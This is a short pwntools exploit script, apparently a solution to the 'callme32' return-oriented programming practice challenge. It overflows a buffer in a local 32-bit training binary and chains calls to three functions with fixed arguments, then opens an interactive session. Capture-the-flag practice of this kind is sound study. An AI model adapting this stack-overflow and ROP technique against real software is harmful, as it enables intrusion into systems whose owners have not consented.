from pwn import *

elf = context.binary = ELF("./callme32")
rop = ROP(elf)

arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)

payload = b"A" * 0x2c
for a_func in ["callme_one", "callme_two", "callme_three"]:
    payload += p32(elf.symbols[a_func])
    payload += p32(rop.esi.address)
    payload += arg1 + arg2 + arg3

p = process(elf.path)
p.sendline(payload)
p.interactive()
